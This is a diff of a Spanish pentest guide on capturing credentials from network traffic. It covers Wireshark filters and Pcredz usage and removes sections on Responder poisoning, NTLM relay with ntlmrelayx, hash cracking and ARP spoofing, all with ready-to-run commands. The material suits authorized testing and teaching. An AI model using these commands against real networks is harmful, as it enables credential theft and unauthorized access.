@@ -1,122 +1,134 @@
 # Búsqueda de Credenciales en Tráfico de Red
 
-La captura pasiva de tráfico permite interceptar credenciales transmitidas en claro o en formatos débiles sin interactuar directamente con los sistemas objetivo. En redes internas donde los protocolos legacy siguen activos, esta técnica es silenciosa y efectiva.
+La mayoría de aplicaciones modernas usan TLS para cifrar el tráfico, pero los entornos reales siempre tienen excepciones: sistemas legacy, servicios mal configurados o aplicaciones internas sin HTTPS. Estos gaps permiten capturar credenciales en texto claro directamente del tráfico de red.
 
-### Protocolos que transmiten credenciales en claro
+### Protocolos sin cifrar vs. sus alternativas seguras
 
-| Protocolo         | Puerto      | Credenciales expuestas                 |
-| ----------------- | ----------- | -------------------------------------- |
-| FTP               | TCP 21      | Usuario y contraseña en texto claro    |
-| Telnet            | TCP 23      | Todo el canal, incluyendo credenciales |
-| HTTP Basic/Digest | TCP 80      | Base64 (Basic) o hash MD5 (Digest)     |
-| SMTP              | TCP 25/587  | AUTH PLAIN / AUTH LOGIN en Base64      |
-| IMAP/POP3         | TCP 143/110 | Credenciales en claro si no hay TLS    |
-| SNMP v1/v2c       | UDP 161     | Community strings en claro             |
-| LDAP              | TCP 389     | Simple bind con contraseña en claro    |
-| HTTP form POST    | TCP 80      | Campos de formulario de login          |
+| Protocolo inseguro | Alternativa cifrada  | Uso                            |
+| ------------------ | -------------------- | ------------------------------ |
+| HTTP               | HTTPS                | Transferencia web              |
+| FTP                | FTPS / SFTP          | Transferencia de archivos      |
+| SNMP v1/v2c        | SNMPv3 (con cifrado) | Gestión de dispositivos de red |
+| POP3               | POP3S                | Recuperación de email          |
+| IMAP               | IMAPS                | Acceso a email en servidor     |
+| SMTP               | SMTPS                | Envío de email                 |
+| LDAP               | LDAPS                | Consultas de directorio (AD)   |
+| RDP                | RDP con TLS          | Escritorio remoto Windows      |
+| SMB v1/v2          | SMB 3.0 sobre TLS    | Compartición de archivos       |
+| VNC                | VNC con TLS/SSL      | Control remoto gráfico         |
+| DNS                | DNS over HTTPS (DoH) | Resolución de nombres          |
 
-### Captura pasiva con tcpdump
+> En redes internas corporativas es frecuente encontrar SNMP v1/v2c, FTP y HTTP activos en dispositivos de red, impresoras y sistemas legacy que nunca fueron migrados a sus alternativas cifradas.
+
+### Wireshark
+
+Wireshark es el analizador de paquetes estándar, incluido por defecto en la mayoría de distribuciones de pentesting. Permite analizar capturas `.pcap`/`.pcapng` o tráfico en vivo.
+
+#### Filtros de display útiles
+
+| Filtro                                           | Descripción                                       |
+| ------------------------------------------------ | ------------------------------------------------- |
+| `http`                                           | Todo el tráfico HTTP                              |
+| `http.request.method == "POST"`                  | Peticiones POST — formularios de login sin cifrar |
+| `http contains "passw"`                          | Paquetes HTTP con la cadena "passw"               |
+| `ftp`                                            | Tráfico FTP (credenciales en claro)               |
+| `snmp`                                           | Tráfico SNMP — community strings visibles         |
+| `dns`                                            | Resoluciones DNS                                  |
+| `tcp.port == 21`                                 | FTP control channel                               |
+| `tcp.port == 23`                                 | Telnet                                            |
+| `ip.addr == 192.168.1.10`                        | Tráfico de un host específico                     |
+| `ip.src == 192.168.1.5 && ip.dst == 192.168.1.1` | Tráfico entre dos hosts                           |
+| `tcp.flags.syn == 1 && tcp.flags.ack == 0`       | Paquetes SYN — detección de escaneos              |
+| `tcp.stream eq 53`                               | Seguir una conversación TCP específica            |
+| `eth.addr == 00:11:22:33:44:55`                  | Tráfico de/hacia una MAC concreta                 |
+
+#### Buscar credenciales en HTTP
+
+Para localizar paquetes con contenido sensible en HTTP:
+
+* Filtro directo: `http contains "passw"` o `http contains "password"`
+* Búsqueda manual: `Edit → Find Packet` → String → `passw`
+* Seguir el stream de un POST sospechoso: click derecho → `Follow → TCP Stream`
+
+Los formularios de login enviados por HTTP sin cifrar exponen usuario y contraseña en el campo `application/x-www-form-urlencoded` del cuerpo del paquete POST.
+
+#### Buscar community strings SNMP
+
+```
+snmp
+```
+
+En el panel de detalles del paquete, el campo `community` contiene la community string en texto claro. Valores como `public`, `private` o strings personalizadas son visibles directamente.
+
+### Pcredz
+
+Pcredz automatiza la extracción de credenciales de capturas o tráfico en vivo sin necesidad de filtrar manualmente en Wireshark.
+
+#### Qué extrae
+
+* Community strings SNMP (v1/v2c)
+* Credenciales FTP, POP3, SMTP, IMAP en texto claro
+* Credenciales de formularios HTTP (Basic auth + POST forms)
+* Hashes NTLMv1/v2 de tráfico SMB, LDAP, MSSQL, DCE-RPC, HTTP
+* Hashes Kerberos AS-REQ (etype 23) — crackeables con Hashcat `-m 18200`
+* Números de tarjeta de crédito
+
+#### Instalación
 
 ```bash
-# Capturar todo el tráfico en la interfaz de red
-sudo tcpdump -i eth0 -w captura.pcap
+# Clonar repositorio e instalar dependencias
+git clone https://github.com/lgandx/PCredz
+cd PCredz
+pip install -r requirements.txt
 
-# Filtrar solo tráfico HTTP
-sudo tcpdump -i eth0 port 80 -A
-
-# Filtrar FTP
-sudo tcpdump -i eth0 port 21 -A
-
-# Captura en modo promiscuo (requiere acceso a switch/hub o port mirroring)
-sudo tcpdump -i eth0 -p -w captura.pcap
+# Alternativa: Docker (ver README del repositorio)
 ```
 
-### Análisis con Wireshark
-
-Para extraer credenciales de un `.pcap` capturado:
-
-* HTTP: `Edit → Find Packet → String → "Authorization"` o filtro `http.authbasic`
-* FTP: filtro `ftp` → buscar paquetes `USER` y `PASS`
-* SMTP: filtro `smtp` → buscar `AUTH`
-* SNMP: filtro `snmp` → community strings visibles en el campo `community`
-
-Desde línea de comandos con `tshark`:
+#### Uso contra un archivo de captura
 
 ```bash
-# Extraer credenciales HTTP Basic
-tshark -r captura.pcap -Y "http.authbasic" -T fields -e http.authbasic
-
-# Extraer comandos FTP
-tshark -r captura.pcap -Y "ftp" -T fields -e ftp.request.command -e ftp.request.arg
-
-# Extraer SMTP AUTH
-tshark -r captura.pcap -Y "smtp.auth" -T fields -e smtp.auth.username -e smtp.auth.password
+./Pcredz -f captura.pcapng -t -v
 ```
 
-### Captura activa de hashes NTLM con Responder
+Salida de ejemplo:
 
-Responder es la herramienta estándar para capturar hashes NTLMv2 en redes Windows mediante envenenamiento de protocolos de resolución de nombres: LLMNR, NBT-NS y mDNS.
+```
+[*] Found SNMPv2 Community string: s3cr3tStr1ng
 
-Cuando un host intenta resolver un nombre que no existe en DNS, difunde la solicitud por LLMNR/NBT-NS. Responder responde haciéndose pasar por el host buscado, lo que fuerza al cliente a autenticarse y revela su hash NTLMv2.
+[*] FTP User: ltnbob
+[*] FTP Pass: qwerty123
+
+[*] NTLMv2 hash: Administrator::WORKGROUP:...
+```
+
+#### Uso contra interfaz en vivo (requiere root)
 
 ```bash
-# Modo escucha y envenenamiento en la interfaz de red
-sudo responder -I eth0 -wrdv
-
-# Solo escucha pasiva (sin envenenamiento — menos ruidoso)
-sudo responder -I eth0 -A
+sudo ./Pcredz -i eth0 -t -v
 ```
 
-Los hashes capturados se guardan en `/usr/share/responder/logs/`:
+| Flag | Descripción                              |
+| ---- | ---------------------------------------- |
+| `-f` | Archivo de captura `.pcap`/`.pcapng`     |
+| `-i` | Interfaz de red para captura en vivo     |
+| `-t` | Activar escaneo de números de tarjeta    |
+| `-v` | Verbose — muestra detalles del procesado |
 
-```
-[SMB] NTLMv2-SSP Hash     : jsmith::EMPRESA:abc123...:hash_completo
-```
+> La captura de tráfico en vivo en redes conmutadas solo recibe el tráfico destinado al propio host o broadcast. Para capturar tráfico de otros hosts se necesita ARP spoofing, port mirroring (SPAN) o acceso físico a un punto de agregación de red.
 
-Cracking del hash capturado:
+### Flujo típico en un pentest interno
+
+Con acceso a un segmento de red interno, el proceso habitual es:
+
+1. Identificar protocolos sin cifrar con un escaneo Nmap (`-sV` sobre puertos 21, 23, 25, 80, 110, 143, 161, 389\`)
+2. Capturar tráfico durante un tiempo razonable con `tcpdump` o Wireshark
+3. Analizar la captura con Pcredz para extracción automática
+4. Revisar manualmente en Wireshark los streams de protocolos de interés
 
 ```bash
-hashcat -m 5600 responder_hashes.txt rockyou.txt -r best64.rule
+# Captura rápida con tcpdump
+sudo tcpdump -i eth0 -w captura.pcapng
+
+# Procesar con Pcredz
+./Pcredz -f captura.pcapng -v
 ```
-
-> Responder con envenenamiento activo es muy ruidoso en redes modernas con monitorización. En entornos con Microsoft Defender for Identity o NDR, los eventos de envenenamiento LLMNR se alertan casi inmediatamente. Evaluar el riesgo de detección antes de activarlo.
-
-### Relay de hashes NTLM — ntlmrelayx
-
-En lugar de crackear el hash, se puede retransmitirlo directamente a otro host para autenticarse sin conocer la contraseña. Requiere que SMB signing esté desactivado en el objetivo.
-
-```bash
-# Verificar si SMB signing está desactivado en la red
-netexec smb 192.168.1.0/24 --gen-relay-list relay_targets.txt
-
-# Lanzar relay (en otra terminal, Responder en modo sin SMB/HTTP para ceder el puerto)
-sudo responder -I eth0 -wrd --disable-ess
-impacket-ntlmrelayx -tf relay_targets.txt -smb2support
-
-# Relay con shell interactiva
-impacket-ntlmrelayx -tf relay_targets.txt -smb2support -i
-
-# Relay ejecutando comando
-impacket-ntlmrelayx -tf relay_targets.txt -smb2support -c "whoami"
-```
-
-> &#x20;NTLMRelay es uno de los ataques más impactantes en redes Windows corporativas con SMB signing desactivado. Un solo hash de admin local o de dominio puede dar acceso inmediato a múltiples sistemas sin necesidad de cracking.
-
-### Captura en redes conmutadas
-
-En redes con switches (la mayoría de redes modernas), la captura pasiva solo recibe el tráfico destinado al propio host o broadcast. Para capturar tráfico de otros hosts se necesita:
-
-* **ARP Spoofing / MITM**: redirigir el tráfico a través del host atacante
-* **Port mirroring (SPAN)**: configurado en el switch, requiere acceso administrativo al switch
-* **Hub legacy o TAP físico**: todo el tráfico es visible
-
-```bash
-# ARP spoofing con arpspoof (dsniff)
-sudo arpspoof -i eth0 -t 192.168.1.10 192.168.1.1   # envenenar víctima
-sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.10   # envenenar gateway
-
-# Habilitar IP forwarding para no cortar el tráfico
-echo 1 > /proc/sys/net/ipv4/ip_forward
-```
-
-> En auditorías internas, la combinación Responder + NTLMRelay suele ser más rápida y silenciosa que ARP spoofing para capturar credenciales Windows.
